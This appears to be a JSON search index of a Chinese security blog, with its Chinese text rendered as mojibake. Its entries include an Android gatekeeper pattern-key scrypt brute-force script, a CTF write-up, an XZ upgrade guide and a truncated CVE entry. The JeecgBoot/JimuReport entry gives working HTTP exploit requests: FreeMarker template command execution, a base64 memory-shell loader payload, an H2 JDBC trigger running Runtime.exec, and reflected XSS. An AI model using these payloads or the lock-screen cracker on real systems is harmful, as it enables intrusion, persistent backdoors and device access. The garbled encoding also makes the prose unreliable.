[

  {
    "title"    : "åœ¨æ£‰èŠ±ç³–åŠä»¥ä¸‹ç‰ˆæœ¬ä¸­è·å–å›¾æ¡ˆå¯†ç ",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Get-Pattern-password-in-Marshmallow-and-below/",
    "date"     : "Feb 18, 2025",
    "content"  : "#0ã€è§£é¢˜å‡†å¤‡éœ€è¦æå‰å‡†å¤‡ï¼špython2.7getekeeper-pattern.keyæ–‡ä»¶#1ã€å‰æå‰ç½®çŸ¥è¯†1ï¼šåœ¨æ—©æœŸç‰ˆæœ¬(2.3-5.1)çš„Androidæ‰‹æœºä¸­ï¼Œé”å±å¯†ç ç›¸å…³çš„æ–‡ä»¶å¦‚ä¸‹ï¼Œè¿™ç§ç±»å‹çš„åŠ å¯†æ–¹å¼æ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦ç ´è§£ç›¸å…³çš„SHA1çš„å“ˆå¸Œå€¼å³å¯ã€‚/data/system/password.key/data/system/gesture.keyåœ¨6.0-8.0ç‰ˆæœ¬çš„Androidæ‰‹æœºä¸­æ–‡ä»¶åŠ å¯†æ–¹å¼åˆ™ç›¸å¯¹å¤æ‚ï¼Œåº”è¯¥é‡‡ç”¨çš„æ˜¯ï¼šscrypt-hashç®—æ³•é”å±å¯†ç ç›¸å…³çš„æ–‡ä»¶å¦‚ä¸‹/data/system/gatekeeper.pattern.key/data/system/gatekeeper.password.key#2ã€å®æ“#2x01è·å–å¯†ç é•¿åº¦åœ¨/data/system/ç›®å½•ä¸‹çš„device_policies.xmlæ–‡ä»¶ä¸­ï¼š&lt;?xmlversion='1.0'encoding='utf-8'standalone='yes'?&gt;&lt;policiessetup-complete=\"true\"&gt;&lt;adminname=\"com.google.android.gms/com.google.android.gms.mdm.receivers.MdmDeviceAdminReceiver\"&gt;&lt;policiesflags=\"540\"/&gt;&lt;disable-bt-contacts-sharingvalue=\"true\"/&gt;&lt;/admin&gt;&lt;active-passwordquality=\"65536\"length=\"7\"uppercase=\"0\"lowercase=\"0\"letters=\"0\"numeric=\"0\"symbols=\"0\"nonletter=\"0\"/&gt;&lt;/policies&gt;æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼šlength=\"7\"äºæ˜¯ç”Ÿæˆè„šæœ¬ï¼›#3x02ç”Ÿæˆå¯†ç å­—å…¸#ç”Ÿæˆæ‰€æœ‰ä¸é‡å¤çš„9ä½å¯†ç ç»„åˆwithopen('password.txt','a')asfile1:forperminitertools.permutations(\"123456789\",7):#ç”Ÿæˆæ‰€æœ‰9ä½ä¸é‡å¤çš„æ’åˆ—password=''.join(perm)#ç»„åˆæˆå­—ç¬¦ä¸²file1.write(password+'\\n')#å†™å…¥æ–‡ä»¶#3x03å®ç°å¯¹åº”åŒ¹é…ç®—æ³•#ScryptLibä¾èµ–å‚æ•°N=16384#CPU/å†…å­˜æ¶ˆè€—å‚æ•°ï¼Œæ§åˆ¶è®¡ç®—å¤æ‚åº¦r=8#å—å¤§å°å‚æ•°ï¼Œæ§åˆ¶å†…å­˜ä½¿ç”¨p=1#å¹¶è¡ŒåŒ–å‚æ•°ï¼Œæ§åˆ¶å¹¶è¡Œè®¡ç®—çš„æ•°é‡#è¯»å–gatekeeper.pattern.keyæ–‡ä»¶withopen('gatekeeper.pattern.key','rb')asf:#ä»¥äºŒè¿›åˆ¶æ¨¡å¼æ‰“å¼€æ–‡ä»¶blob=f.read()#è¯»å–æ–‡ä»¶å†…å®¹åˆ°å˜é‡blob#æå–å…³é”®ä¿¡æ¯s=struct.Struct('&lt;'+'17s8s32s')#å®šä¹‰äºŒè¿›åˆ¶æ•°æ®çš„è§£ææ ¼å¼ï¼š17å­—èŠ‚å­—ç¬¦ä¸²+8å­—èŠ‚å­—ç¬¦ä¸²+32å­—èŠ‚å­—ç¬¦ä¸²(meta,salt,signature)=s.unpack_from(blob)#ä»blobä¸­è§£æå‡ºmetaã€saltå’Œsignature#è¯»å–å­—å…¸æ–‡ä»¶withopen('password.txt','r')asf1:#ä»¥åªè¯»æ¨¡å¼æ‰“å¼€å­—å…¸æ–‡ä»¶lines=f1.readlines()#è¯»å–æ‰€æœ‰è¡Œåˆ°åˆ—è¡¨lines#éå†å­—å…¸å°è¯•ç ´è§£fordatainlines:password=data.strip()#å»é™¤æ¯è¡Œé¦–å°¾çš„ç©ºç™½å­—ç¬¦ï¼ˆå¦‚æ¢è¡Œç¬¦ï¼‰#ç¡®ä¿å¯†ç ä¸ºäºŒè¿›åˆ¶æ ¼å¼password_bytes=password.encode('utf-8')#å°†å¯†ç å­—ç¬¦ä¸²ç¼–ç ä¸ºUTF-8æ ¼å¼çš„å­—èŠ‚to_hash=meta+password_bytes#ç»„åˆmetaå’Œå¯†ç å­—èŠ‚ï¼Œå½¢æˆå¾…å“ˆå¸Œçš„æ•°æ®#è®¡ç®—ScryptHashhash_result=scrypt.hash(to_hash,salt,N,r,p)#ä½¿ç”¨Scryptç®—æ³•è®¡ç®—å“ˆå¸Œå€¼#æ‰“å°è°ƒè¯•ä¿¡æ¯print'Passed:%s'%password#æ‰“å°å½“å‰å°è¯•çš„å¯†ç print'signature:%s'%signature.encode('hex')#æ‰“å°ç­¾åï¼ˆåå…­è¿›åˆ¶æ ¼å¼ï¼‰print'Hash:%s'%hash_result[0:32].encode('hex')#æ‰“å°å“ˆå¸Œå€¼çš„å‰32ä½ï¼ˆåå…­è¿›åˆ¶æ ¼å¼ï¼‰print'Equal:%s'%(hash_result[0:32]==signature)#æ¯”è¾ƒå“ˆå¸Œå€¼çš„å‰32ä½ä¸ç­¾åæ˜¯å¦ç›¸ç­‰ifhash_result[0:32]==signature:#å¦‚æœåŒ¹é…ï¼Œæ‰“å°æˆåŠŸå¯†ç å¹¶ç»ˆæ­¢ç¨‹åºprint\"Matched:%s\"%password#æ‰“å°æ‰¾åˆ°çš„å¯†ç print\"SUccess\"#æ‰“å°æˆåŠŸä¿¡æ¯exit(0)#é€€å‡ºç¨‹åº#å¦‚æœéå†å®Œæ‰€æœ‰å¯†ç ä»æœªæ‰¾åˆ°åŒ¹é…é¡¹print\"Unmatched...\"#æ‰“å°æœªæ‰¾åˆ°åŒ¹é…å¯†ç çš„ä¿¡æ¯å¦‚æœæˆåŠŸçš„è¯ä¼šè¾“å‡ºå¦‚ä¸‹ï¼š$python2crack.pyPassed:1256987signature:ef68fd098aad3083794dbebaf9190bf1d981956d8a3301aece73cdfb4ed3bd6eHash:ef68fd098aad3083794dbebaf9190bf1d981956d8a3301aece73cdfb4ed3bd6eEqual:TrueMatched:1256987Success!#3x04ä»£ç #!/usr/bin/python#-*-coding:utf-8-*-importitertoolsimportstructimportbinasciiimportscryptdefRock():N=16384r=8p=1withopen('gatekeeper.pattern.key','rb')asf:blob=f.read()s=struct.Struct('&lt;'+'17s8s32s')(meta,salt,signature)=s.unpack_from(blob)withopen('password.txt','r')asf1:lines=f1.readlines()fordatainlines:password=data.strip()password_bytes=password.encode('utf-8')to_hash=meta+password_byteshash_result=scrypt.hash(to_hash,salt,N,r,p)print'Passed:%s'%passwordprint'signature:%s'%signature.encode('hex')print'Hash:%s'%hash_result[0:32].encode('hex')print'Equal:%s'%(hash_result[0:32]==signature)ifhash_result[0:32]==signature:print\"Matched:%s\"%passwordprint\"Success!\"exit(0)print\"Unmatched...\"defPasslist():withopen('password.txt','a')asfile1:forperminitertools.permutations(\"123456789\",7):password=''.join(perm)file1.write(password+'\\n')Rock()if__name__==\"__main__\":Passlist()Pythonä»£ç æ€»ç»“è¯¥Pythonè„šæœ¬å°è¯•é€šè¿‡æš´åŠ›ç ´è§£çš„æ–¹å¼ï¼Œä½¿ç”¨scryptå¯†é’¥æ´¾ç”Ÿå‡½æ•°å’Œä¸€ä¸ªå¯†ç æ¨¡å¼è¿›è¡Œå¯†ç ç ´è§£ã€‚å®ƒé¦–å…ˆå°è¯•ä»å¯†ç åˆ—è¡¨ä¸­åŒ¹é…å¯†ç ï¼Œå¹¶å°†ç”Ÿæˆçš„å“ˆå¸Œä¸å­˜å‚¨çš„ç­¾åè¿›è¡Œæ¯”è¾ƒï¼ŒæŸ¥çœ‹æ˜¯å¦åŒ¹é…ã€‚ä¸»è¦å‡½æ•°Rock()è¯»å–æ–‡ä»¶gatekeeper.pattern.keyï¼Œå…¶ä¸­åŒ…å«å…ƒæ•°æ®ã€ç›å€¼å’Œç­¾åã€‚ä»password.txtæ–‡ä»¶ä¸­è¯»å–å¯†ç åˆ—è¡¨ã€‚å¯¹æ¯ä¸ªå¯†ç ï¼Œä½¿ç”¨scryptå‡½æ•°å¯¹å…ƒæ•°æ®å’Œå¯†ç çš„æ‹¼æ¥ç»“æœè¿›è¡Œå“ˆå¸Œè®¡ç®—ã€‚å°†è®¡ç®—å‡ºçš„å“ˆå¸Œå€¼ä¸å­˜å‚¨çš„ç­¾åè¿›è¡Œæ¯”è¾ƒï¼ŒæŸ¥çœ‹æ˜¯å¦åŒ¹é…ã€‚å¦‚æœæ‰¾åˆ°äº†åŒ¹é…çš„å¯†ç ï¼Œæ‰“å°è¯¥å¯†ç å¹¶é€€å‡ºç¨‹åºã€‚Passlist()ç”Ÿæˆä»æ•°å­—1-9ä¸­å–7ä½æ•°çš„æ‰€æœ‰å¯èƒ½æ’åˆ—ï¼Œå¹¶å†™å…¥password.txtæ–‡ä»¶ã€‚åœ¨ç”Ÿæˆå®Œå¯†ç åˆ—è¡¨åï¼Œè°ƒç”¨Rock()æ¥æ£€æŸ¥è¿™äº›ç”Ÿæˆçš„å¯†ç ã€‚ä¸»è¦ç»„ä»¶scryptï¼šç”¨äºå¯†ç å’Œç›å€¼çš„å“ˆå¸Œè®¡ç®—ï¼Œç»“åˆäº†å†…å­˜å¯†é›†å‹å’ŒCPUå¯†é›†å‹çš„ç®—æ³•ã€‚itertools.permutationsï¼šç”¨äºç”Ÿæˆä»ç»™å®šå­—ç¬¦é›†ï¼ˆ1-9ï¼‰ä¸­å–7ä½æ•°çš„æ‰€æœ‰æ’åˆ—ã€‚structï¼šç”¨äºä»gatekeeper.pattern.keyæ–‡ä»¶ä¸­è§£æå‡ºå…ƒæ•°æ®ã€ç›å€¼å’Œç­¾åã€‚ä»£ç æµç¨‹è¯¦è§£è¯»å–å¯†é’¥(Rock())ï¼šè¯»å–gatekeeper.pattern.keyæ–‡ä»¶ï¼Œå°†å…¶è§£åŒ…ä¸ºä¸‰ä¸ªå˜é‡ï¼šmetaï¼ˆ17å­—èŠ‚å­—ç¬¦ä¸²ï¼‰ã€saltï¼ˆ8å­—èŠ‚å­—ç¬¦ä¸²ï¼‰å’Œsignatureï¼ˆ32å­—èŠ‚å­—ç¬¦ä¸²ï¼‰ã€‚ä»password.txtä¸­è¯»å–å¯†ç åˆ—è¡¨ã€‚å¯¹äºæ¯ä¸ªå¯†ç ï¼Œè„šæœ¬ï¼šä½¿ç”¨scryptå‡½æ•°å¯¹metaå’Œå¯†ç ï¼ˆUTF-8ç¼–ç ï¼‰è¿›è¡Œå“ˆå¸Œè®¡ç®—ã€‚å°†å“ˆå¸Œçš„å‰32å­—èŠ‚ä¸å­˜å‚¨çš„ç­¾åè¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœå“ˆå¸Œå€¼ä¸ç­¾ååŒ¹é…ï¼Œåˆ™æ‰“å°å‡ºå¯†ç ï¼Œå¹¶é€€å‡ºç¨‹åºã€‚ç”Ÿæˆå¯†ç åˆ—è¡¨(Passlist())ï¼šè¯¥å‡½æ•°ä½¿ç”¨itertools.permutationsç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„7ä½æ•°æ’åˆ—ï¼Œå­—ç¬¦é›†ä¸º\"123456789\"ï¼Œå¹¶å°†å®ƒä»¬å†™å…¥password.txtæ–‡ä»¶ã€‚ç”Ÿæˆå®Œå¯†ç åˆ—è¡¨åï¼Œè°ƒç”¨Rock()æ¥æ£€æŸ¥è¿™äº›ç”Ÿæˆçš„å¯†ç ã€‚å¤–éƒ¨åº“scryptï¼šç”¨äºå¯†é’¥æ´¾ç”Ÿå‡½æ•°ï¼Œç»“åˆç›å€¼å’Œå¯†ç ç”Ÿæˆå“ˆå¸Œå€¼ã€‚itertoolsï¼šç”¨äºç”Ÿæˆå¯†ç çš„æ’åˆ—ç»„åˆã€‚structï¼šç”¨äºè§£æäºŒè¿›åˆ¶æ•°æ®ã€‚æ³¨æ„äº‹é¡¹WindowsError:[Error126]ps&gt;python2.\\crypt.pyTraceback(mostrecentcalllast):File\".\\crypt.py\",line4,in&lt;module&gt;importscryptFile\"C:\\Python27\\lib\\site-packages\\scrypt.py\",line11,in&lt;module&gt;_scrypt=cdll.LoadLibrary(imp.find_module('_scrypt')[1])File\"C:\\Python27\\lib\\ctypes\\__init__.py\",line444,inLoadLibraryreturnself._dlltype(name)File\"C:\\Python27\\lib\\ctypes\\__init__.py\",line366,in__init__self._handle=_dlopen(self._name,mode)WindowsError:[Error126]éœ€è¦ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤å®‰è£…scryptåº“ï¼špython2-mpipinstallscrypt==0.8.11REFCrackinggatekeeper.pattern.keyÂ &#8617;"
  },

  {
    "title"    : "zh",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/",
    "date"     : "Feb 1, 2025",
    "content"  : "ThisarticleisavailableinEnglish.ä½¿ç”¨Gitè¦åœ¨å‘½ä»¤è¡Œä¸Šä½¿ç”¨Gitï¼Œæ‚¨éœ€è¦åœ¨è®¡ç®—æœºä¸Šä¸‹è½½ã€å®‰è£…å’Œé…ç½®Gitã€‚æ‚¨ä¹Ÿå¯ä»¥ä»å‘½ä»¤è¡Œå®‰è£…ä»¥ä½¿ç”¨ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ï¼šâ€œå…³äºâ€ã€‚å¦‚æœæ‚¨æƒ³åœ¨æœ¬åœ°ä½¿ç”¨Gitï¼Œä½†ä¸æƒ³ä½¿ç”¨å‘½ä»¤è¡Œï¼Œæ‚¨å¯ä»¥ä¸‹è½½å¹¶å®‰è£…å®¢æˆ·ç«¯ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…â€œå®‰è£…å’Œé…ç½®â€ã€‚å¦‚æœæ‚¨ä¸éœ€è¦åœ¨æœ¬åœ°å¤„ç†æ–‡ä»¶ï¼Œå¯ä»¥è®©æ‚¨ç›´æ¥åœ¨æµè§ˆå™¨ä¸­å®Œæˆè®¸å¤šä¸Gitç›¸å…³çš„æ“ä½œï¼ŒåŒ…æ‹¬ï¼šä»“åº“å¿«é€Ÿå…¥é—¨ä¸ºå­˜å‚¨åº“åˆ›å»ºåˆ†æ”¯ç®¡ç†æ–‡ä»¶åœ¨Githubä¸Šå¯»æ‰¾çµæ„Ÿè®¾ç½®Gitä¸‹è½½å¹¶å®‰è£…æœ€æ–°ç‰ˆæœ¬çš„Gitã€‚æ³¨æ„ï¼šå¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯ChromeOSè®¾å¤‡ï¼Œåˆ™éœ€è¦è¿›è¡Œé¢å¤–è®¾ç½®ï¼šåœ¨æ‚¨çš„ChromeOSè®¾å¤‡ä¸Šä»GooglePlayStoreå®‰è£…ç»ˆç«¯ä»¿çœŸå™¨ï¼ˆä¾‹å¦‚Termuxï¼‰ã€‚ä»æ‚¨å®‰è£…çš„ç»ˆç«¯ä»¿çœŸå™¨å®‰è£…Gitã€‚ä¾‹å¦‚ï¼Œåœ¨Termuxä¸­è¾“å…¥aptinstallgitï¼Œç„¶ååœ¨å‡ºç°æç¤ºæ—¶è¾“å…¥yã€‚åœ¨Gitä¸­è®¾ç½®ç”¨æˆ·åè®¾ç½®æäº¤ç”µå­é‚®ä»¶åœ°å€ä»Gitè¿›è¡Œèº«ä»½éªŒè¯å½“æ‚¨ä»Gitè¿æ¥åˆ°å­˜å‚¨åº“æ—¶ï¼Œæ‚¨å°†éœ€è¦ä½¿ç”¨HTTPSæˆ–SSHè¿›è¡Œèº«ä»½éªŒè¯ã€‚æ³¨æ„ï¼šæ‚¨å¯ä»¥ä½¿ç”¨,å¯¹äºHTTPæˆ–SSHè¿›è¡Œèº«ä»½éªŒè¯ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ghauthç™»å½•ã€‚é€šè¿‡HTTPSè¿æ¥ï¼ˆæ¨èï¼‰å¦‚æœæ‚¨ä½¿ç”¨HTTPSå…‹éš†ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å‡­æ®åŠ©æ‰‹åœ¨Gitä¸­ç¼“å­˜å‡­æ®ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ï¼šâ€œä½¿ç”¨HTTPSURLå…‹éš†â€â€œåœ¨Gitä¸­ç¼“å­˜GitHubå‡­æ®â€ã€‚é€šè¿‡SSHè¿æ¥å¦‚æœæ‚¨ä½¿ç”¨SSHå…‹éš†ï¼Œåˆ™å¿…é¡»åœ¨ç”¨äºæ¨é€æˆ–æ‹‰å–çš„æ¯å°è®¡ç®—æœºä¸Šç”ŸæˆSSHå¯†é’¥ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ï¼šâ€œä½¿ç”¨SSHURLå…‹éš†â€â€œç”Ÿæˆæ–°çš„SSHå¯†é’¥å¹¶å°†å…¶æ·»åŠ åˆ°ssh-agentâ€ã€‚åç»­æ­¥éª¤æ‚¨ç°åœ¨å·²æ‹¥æœ‰Gitå¹¶å·²å®Œæˆæ‰€æœ‰è®¾ç½®ã€‚æ‚¨ç°åœ¨å¯ä»¥é€‰æ‹©åˆ›å»ºä¸€ä¸ªå­˜å‚¨åº“æ¥æ”¾ç½®æ‚¨çš„é¡¹ç›®ã€‚å°†ä»£ç ä¿å­˜åœ¨å­˜å‚¨åº“ä¸­å¯è®©æ‚¨å¤‡ä»½ä»£ç å¹¶å°†å…¶ä¸å…¨ä¸–ç•Œå…±äº«ã€‚"
  },

  {
    "title"    : "2024å¹´ç½‘é¼æ¯ç„æ­¦ç»„èµ›é¢˜å†ç¨‹",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/WANGDINGCTF2024-Walkthrough/",
    "date"     : "Dec 15, 2024",
    "content"  : "1ã€MISC011.1ã€èµ›é¢˜æè¿°1.2ã€è§£é¢˜æ€è·¯æ ¹æ®æç¤ºå¯»æ‰¾å¼‚å¸¸GTPåè®®ä¸­å¼‚å¸¸çš„teidï¼Œå°†teidä½œä¸ºåˆ—å¯¼å‡ºæ‰€æœ‰GTPæµé‡ï¼šç”Ÿæˆcsvæ–‡ä»¶å¦‚ä¸‹ï¼Œåœ¨GTPæŠ¥æ–‡ä¸­ï¼ŒTEIDåº”è¯¥æ˜¯å”¯ä¸€çš„ï¼Œç¡®ä¿æŠ¥æ–‡çš„æ­£ç¡®è§£æå’Œå¤„ç†ï¼Œå¤šä¸ªTEIDçš„å­˜åœ¨å¯èƒ½ä¼šè¢«è§†ä¸ºæ”»å‡»è¿¹è±¡ï¼Œä¾‹å¦‚ï¼šé‡æ”¾æ”»å‡»æˆ–ä¼ªé€ æŠ¥æ–‡ï¼Œå‘ç°æ„é€ çš„teidå¦‚ä¸‹ï¼šæ ¹æ®æç¤ºæ’åˆ—ç”Ÿæˆflagï¼šwdflag{1934614239214098}2ã€MISC042.1ã€èµ›é¢˜æè¿°2.2ã€è§£é¢˜æ€è·¯binwalkåˆ†æä½¿ç”¨binwalkåˆ†ææ–‡ä»¶ï¼Œå‘ç°1æ–‡ä»¶ä¸ºzipæ–‡ä»¶ï¼Œå¹¶é™„ç¬¬ä¸€å¼ ç¿»è½¬å›¾ç‰‡å’Œå¯†ç ï¼Œæé†’éœ€è¦çˆ†ç ´å››ä½æ•°ï¼šç”Ÿæˆå­—å…¸åï¼Œåˆ©ç”¨çˆ†ç ´å‡ºæ­£ç¡®ç”¨æˆ·åå¯†ç ï¼šä½¿ç”¨å›¾ç‰‡crcè®¡ç®—å·¥å…·æš´åŠ›ç ´è§£è·å¾—å›¾ç‰‡ï¼šæˆåŠŸè·å–åˆ°flagã€‚wdflag{1234576eee739d811904bea4860s4eg5}3ã€â€¦"
  },

  {
    "title"    : "JimuReport Vuln WalkThrough backup",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/JimuReport-Vuln-WalkThrough-backup/",
    "date"     : "Aug 1, 2024",
    "content"  : "REFxzcommunity::JimuReportï¼œ=v1.6.0æ¼æ´åˆ†æGithub:wy876:https://github.com/wy876/POC/blob/main/JeecgBoot%E6%BC%8F%E6%B4%9E.mdGithub:wy876:JeecgBootåå°„å‹XSSæ¼æ´JeecgBootsqlæ³¨å…¥æ¼æ´POST/jeecg-boot/jmreport/queryFieldBySqlHTTP/1.1Host:192.168.90.1:3100Origin:http://192.168.90.1:3100User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/115.0.0.0Safari/537.36Accept:*/*Accept-Encoding:gzip,deflateAccept-Language:zh-CN,zh;q=0.9Connection:closeContent-Type:application/jsonContent-Length:123{\"sql\":\"select'result:&lt;#assignex=\\\"freemarker.template.utility.Execute\\\"?new()&gt;${ex(\\\"open-acalculator.app\\\")}'\"}queryFieldBySqlæ³¨å…¥å†…å­˜é©¬{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval(\\\"classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('org.apachen.SOAPUtils').newInstance();}catch(e){clsString=classLoader.loadClass('java.lang.String');bytecodeBase64='è¿™é‡Œå¡«å…¥base64çš„å†…å­˜é©¬';try{clsBase64=classLoader.loadClass('java.util.Base64');clsDecoder=classLoader.loadClass('java.util.Base64$Decoder');decoder=clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode=clsDecoder.getMethod('decode',clsString).invoke(decoder,bytecodeBase64);}catch(ee){try{datatypeConverterClz=classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode=datatypeConverterClz.getMethod('parseBase64Binary',clsString).invoke(datatypeConverterClz,bytecodeBase64);}catch(eee){clazz1=classLoader.loadClass('sun.misc.BASE64Decoder');bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);}}clsClassLoader=classLoader.loadClass('java.lang.ClassLoader');clsByteArray=(''.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod('defineClass',[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();};#{1};\\\")}\",\"dbSource\":\"\",\"type\":\"0\"}ä½¿ç”¨å†…å­˜é©¬å·¥å…·ç”Ÿæˆpayloadï¼Œå°†ç”Ÿæˆçš„base64æ ¼å¼çš„å†…å­˜é©¬æ›¿æ¢payloadä¸­bytecodeBase64çš„å€¼å†…å­˜é©¬è·¯å¾„ï¼šhttp://192.168.18.131:8080/jeecg-boot/jmreport/queryFieldBySql/JeecgBootSSTIæ¼æ´POST/jeecgboot/jmreport/testConnectionHTTP/1.1Host:192.168.90.1:3100Content-Length:383Accept:application/json,text/plain,*/*User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/115.0.0.0Safari/537.36Content-Type:application/json;charset=UTF-8Origin:http://192.168.90.1:3100Referer:http://192.168.90.1:3100/login?redirect=/dashboard/analysisAccept-Encoding:gzip,deflateAccept-Language:zh-CN,zh;q=0.9Connection:close{\"id\":\"1\",\"code\":\"dataSource1\",\"dbType\":\"H2\",\"dbDriver\":\"org.h2.Driver\",\"dbUrl\":\"jdbc:h2:mem:test;init=CREATETRIGGERshellBEFORESELECTONINFORMATION_SCHEMA.TABLESAS$$//javascript\\u000A\\u0009java.lang.Runtime.getRuntime().exec('open-acalculator.app')\\u000A$$\",\"dbName\":\"test\",\"dbUsername\":\"sa\",\"dbPassword\":\"\",\"connectTimes\":5}æ¼æ´åˆ†æhttps://c0olw.github.io/2023/08/15/JeecgBoot-SSTI%E4%BB%A5%E5%8F%8AJDBC-RCE/JeecgBootåå°„å‹XSSæ¼æ´GET/userController.do?%3CsCrIpT%3Ealert(document.domain)%3C/sCrIpT%3EHTTP/1.1Host:User-Agent:Mozilla/5.0(Macintosh;IntelMacOSX10.15;rv:126.0)Gecko/20100101Firefox/126.0"
  },

  {
    "title"    : "ã€ŒmacOSã€æ›´æ–°XZ | Upgrade Your XZ Version",
    "category" : "",
    "tags"     : "XZ, Supply Chain Poisoning",
    "url"      : "/blog/2024/Upgrade-Your-XZ-Version/",
    "date"     : "Jul 18, 2024",
    "content"  : "5.6.2(2024-05-29)https://github.com/tukaani-project/xz/releases/tag/v5.6.2changelogRemovethebackdoor(CVE-2024-3094).Notchanged:Memorysanitizer(MSAN)hasafalsepositiveintheCRCCLMULcodewhichalsomakesOSSFuzzunhappy.Valgrindissmarteranddoesnâ€™tcomplain.â€¦æ•ˆæœå›¾1.ä½¿ç”¨Homebrewå®‰è£…æœ€æ–°ç‰ˆæœ¬é€šå¸¸æƒ…å†µä¸‹ï¼Œå®‰è£…æœ€æ–°ç‰ˆæœ¬çš„XZå¯èƒ½æ˜¯ä¸€ä¸ªæ›´å¥½çš„é€‰æ‹©ï¼Œç‰¹åˆ«æ˜¯å¦‚æœæ‚¨ä¸éœ€è¦ç‰¹å®šç‰ˆæœ¬çš„ç‰¹å®šåŠŸèƒ½æˆ–ä¿®å¤ã€‚brewinstallxzè¿™å°†å®‰è£…Homebrewä¸­å¯ç”¨çš„æœ€æ–°ç‰ˆæœ¬çš„XZã€‚2.æ‰‹åŠ¨ä¸‹è½½å’Œå®‰è£…ç‰¹å®šç‰ˆæœ¬å¦‚æœæ‚¨éå¸¸éœ€è¦ç‰¹å®šç‰ˆæœ¬çš„XZï¼Œå¯ä»¥æ‰‹åŠ¨ä¸‹è½½è¯¥ç‰ˆæœ¬çš„æºä»£ç å¹¶è¿›è¡Œç¼–è¯‘å’Œå®‰è£…ã€‚æ­¥éª¤å¦‚ä¸‹ï¼šå‰å¾€TukaaniXZGithubï¼Œæ‰¾åˆ°å¹¶ä¸‹è½½æ‚¨éœ€è¦çš„ç‰¹å®šç‰ˆæœ¬çš„æºä»£ç ï¼ˆä¾‹å¦‚ï¼Œxz-5.2.5.tar.gzï¼‰ã€‚è§£å‹ç¼©ä¸‹è½½çš„æºä»£ç åŒ…ï¼štar-xzvfxz-5.6.2.tar.gzcdxz-5.6.2ç¼–è¯‘å’Œå®‰è£…ï¼š./configuremakesudomakeinstalléªŒè¯å®‰è£…ï¼šxz--version"
  },

  {
    "title"    : "ã€ŒOBS on MacOS13ã€:ï¼ˆæ‚ é›…deï¼‰å½•åˆ¶æ¡Œé¢å£°éŸ³",
    "category" : "",
    "tags"     : "MacOS13, OBS",
    "url"      : "/blog/2022/Record-Sounds-in-macOS13-by-OBS/",
    "date"     : "Dec 13, 2022",
    "content"  : "è§£å†³é—®é¢˜ï¼šä½¿ç”¨å‘½ä»¤æ‰“å¼€OBSåå­˜åœ¨ç»ˆç«¯ã€‚æ·»åŠ OBSå£°éŸ³ç›®å‰ä½¿ç”¨çš„MacOS13ï¼Œç”±äºæ–°ç‰ˆç³»ç»Ÿæƒé™é—®é¢˜ï¼ŒOBSæ— æ³•è‡ªåŠ¨å–å¾—æ¡Œé¢å£°éŸ³ï¼Œåªèƒ½ä¾é ç¬¬ä¸‰æ–¹è½¯ä»¶1æˆ‘è¿™é‡Œç”¨çš„æ˜¯iShowUï¼Œå‚è€ƒ1ä¸­ä½¿ç”¨çš„æ˜¯soundflowerï¼Œåº”è¯¥æ“ä½œéƒ½å·®ä¸å¤šï¼›ç„¶åéœ€è¦åœ¨ç»ˆç«¯ä¸­æ‰§è¡Œæ·»åŠ å‚æ•°å¿«æ·æ–¹å¼çš„å‘½ä»¤æ‰èƒ½å½•åˆ¶æ¡Œé¢å£°éŸ³ï¼šopen/Applications/OBS.app/Contents/MacOS/OBS--args-pictureè§£å†³ä½¿ç”¨è‡ªåŠ¨æ“ä½œå³å¯ï¼ŒåŸºæœ¬æ“ä½œå¯ä»¥æŸ¥çœ‹å‚è€ƒ2ã€‚è¿è¡Œshellæ‰“å¼€è‡ªåŠ¨æ“ä½œ-&gt;è¿è¡Œshellè„šæœ¬-&gt;å¡«å…¥ä»¥ä¸‹ï¼šcd/Applications/OBS.app/Contents/MacOS/&amp;&amp;nohup./OBS--args-picture-Xdock:icon=/Applications/OBS.app/Contents/Resources/AppIcon.icns&amp;ç¾åŒ–ç„¶åæ‹–è¿›Dockæ è¿è¡Œå³å¯ï¼Œå°±ä¸ä¼šå­˜åœ¨ç»ˆç«¯äº†ã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§æ–¹å¼æ˜¯é€šè¿‡è‡ªåŠ¨æ“ä½œappè¿è¡Œçš„OBSï¼Œæ‰€ä»¥éœ€è¦é¢å¤–èµ‹ï¼ˆå±å¹•å½•åˆ¶+éº¦å…‹é£ï¼‰æƒé™ç»™è‡ªåŠ¨æ“ä½œã€‚REFmacOSä¸‹OBSæ²¡æœ‰æ¡Œé¢å£°éŸ³ä¸”ä¸å½•éŸ³Â &#8617;MacOSXä¸­å¸¦å‚æ•°å¯åŠ¨åº”ç”¨ç¨‹åºï¼ˆå¦‚Chromeï¼‰çš„æ–¹æ³•æ¯”è¾ƒÂ &#8617;"
  },

  {
    "title"    : "OpenliteSpeed CVE-2022-0072 Vulns",
    "category" : "about",
    "tags"     : "",
